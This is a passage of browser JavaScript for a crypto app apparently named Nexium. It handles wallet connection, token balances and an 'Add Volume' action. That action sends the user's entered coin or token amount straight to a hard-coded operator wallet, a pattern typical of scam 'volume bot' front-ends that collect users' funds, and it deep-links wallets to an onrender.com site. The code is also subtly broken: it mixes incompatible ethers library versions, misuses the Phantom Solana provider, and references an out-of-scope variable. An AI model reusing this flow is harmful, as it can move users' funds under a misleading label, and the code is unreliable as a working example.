    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.currentPaymentToken) {
      this.showFeedback('Please select a token.', 'error');
      this.dom.tokenSelect?.focus();
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleVolumeLoading(true);
      this.showProcessingSpinner();
      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      let amount = ethers.parseUnits(this.dom.volumeInput?.value || '0', this.currentPaymentToken.decimals);
      if (amount <= 0n) {
        this.showFeedback('Invalid amount entered.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      if (amount > this.currentPaymentToken.balance) {
        this.showFeedback('Insufficient balance for amount.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
      const feeData = await this.provider.getFeeData();
      let tx;
      if (selectedToken.isNative) {
        const gasLimit = 21000;
        const gasCost = (feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei')).mul(gasLimit);
        if (amount.add(gasCost) > this.currentPaymentToken.balance) {
          this.showFeedback('Insufficient balance for gas.', 'error');
          this.hideProcessingSpinner();
          return;
        }
        console.log(`Adding volume for ${selectedToken.symbol} with amount: ${ethers.formatUnits(amount, 18)}`);
        tx = await this.signer.sendTransaction({
          to: YOUR_WALLET_ADDRESS,
          value: amount,
          gasLimit,
          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
        });
      } else {
        const contract = new ethers.Contract(paymentTokenAddress, MINIMAL_ERC20_ABI, this.signer);
        const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, amount).catch(() => 200000);
        console.log(`Adding volume for ${selectedToken.symbol} with gasLimit: ${gasLimit}`);
        const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, amount]);
        tx = await this.signer.sendTransaction({
          to: paymentTokenAddress,
          data,
          gasLimit,
          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
        });
      }
      console.log('Volume transaction sent:', tx.hash);
      await tx.wait(1);
      this.showFeedback(`Successfully transferred ${ethers.formatUnits(amount, selectedToken.decimals)} ${selectedToken.symbol}`, 'success');
      this.dom.volumeInput.value = '';
    } catch (error) {
      console.error('Add volume error:', error);
      this.showFeedback(`Error transferring ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
    } finally {
      this.toggleVolumeLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleVolumeLoading(isLoading) {
    if (!this.dom.addVolumeBtn) return;
    this.dom.addVolumeBtn.disabled = isLoading;
    this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
    this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
    this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    if (this.dom.beautifyAddVolumeBtn) {
      this.dom.beautifyAddVolumeBtn.disabled = isLoading;
      this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.beautifyAddVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.beautifyAddVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  checkConnectivity() {
    if (!navigator.onLine) this.showFeedback('No internet connection.', 'error');
  }

  handleOnline() {
    if (this.isWalletConnected()) this.renderTokenInterface();
    else this.showMetaMaskPrompt();
  }

  handleOffline() {
    this.showFeedback('No internet connection.', 'error');
    this.showDefaultPrompt();
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    this.dom.metamaskPrompt.innerHTML = `
      <p class="text-white text-center">Connect with: <br>
        <button class="wallet-connect bg-orange-400 text-black px-2 py-1 rounded mx-1" data-wallet="metamask">MetaMask</button>
        <button class="wallet-connect bg-orange-400 text-black px-2 py-1 rounded mx-1" data-wallet="phantom">Phantom</button>
        <button class="wallet-connect bg-orange-400 text-black px-2 py-1 rounded mx-1" data-wallet="trust">Trust Wallet</button>
      </p>
    `;
    this.dom.metamaskPrompt.querySelectorAll('.wallet-connect').forEach(button => {
      button.addEventListener('click', () => this.handleWalletConnect(button.dataset.wallet));
    });
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
  }

  showFeedback(message, type = 'info') {
    console.log(`Showing feedback: ${message} (${type})`);
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : type === 'warning' ? 'bg-yellow-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
  }

  getTokenSymbol(address) {
    const token = TOKEN_LIST.find(t => t.address === address || (t.isNative && address === null));
    return token ? token.symbol : 'Unknown';
  }

  shortenAddress(address) {
    if (!address) return 'Native Token';
    if (!ethers.isAddress(address)) return 'Invalid Address';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  handleConnectionError(error) {
    console.error('Connection error details:', error);
    this.showFeedback(`Wallet connection failed: ${error.message}`, 'error');
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.showMetaMaskPrompt();
    this.hideProcessingSpinner();
  }

  async handleWalletConnect(wallet) {
    this.walletType = wallet;
    if (wallet === 'phantom' && 'phantom' in window) {
      try {
        const resp = await window.phantom.solana.connect();
        this.provider = new ethers.BrowserProvider(window.phantom.solana);
        this.signer = await this.provider.getSigner();
        this.hideMetaMaskPrompt();
        this.handleSuccessfulConnection();
      } catch (error) {
        this.showFeedback('Failed to connect with Phantom.', 'error');
      }
    } else if (wallet === 'trust' && window.ethereum?.isTrust) {
      await this.connectWallet();
    } else if (wallet === 'metamask' && window.ethereum?.isMetaMask) {
      await this.connectWallet();
    } else {
      // Always redirect to deep link if extension is not detected
      this.showFeedback(`Opening ${wallet} app...`, 'info');
      if (wallet === 'phantom') {
        window.location = 'https://phantom.app/ul/deep-link?link=https://nexium-bot.onrender.com';
      } else if (wallet === 'trust') {
        window.location = 'https://links.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com';
      }
    }
  }

  async updateTokenSelect() {
    if (!this.signer || !this.dom.tokenSelect) return;
    const userAddress = await this.signer.getAddress();
    const updatedOptions = await Promise.all(TOKEN_LIST.map(async (token) => {
      if (token.isNative) {
        const balance = await this.provider.getBalance(userAddress);
        return { ...token, balance: ethers.formatUnits(balance, token.decimals) };
      } else {
        const contract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, this.provider);
        const [balance, decimals] = await Promise.all([
          contract.balanceOf(userAddress),
          contract.decimals()
        ]);
        return { ...token, balance: ethers.formatUnits(balance, decimals) };
      }
    }));
    this.dom.tokenSelect.innerHTML = `
      <option value="" disabled ${!this.signer ? 'selected' : ''}>Select payment token</option>
      ${updatedOptions.map(t => `<option value="${t.address || ''}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.balance.slice(0, 8)} ${t.symbol})</option>`).join('')}
    `;
  }
}

new NexiumApp();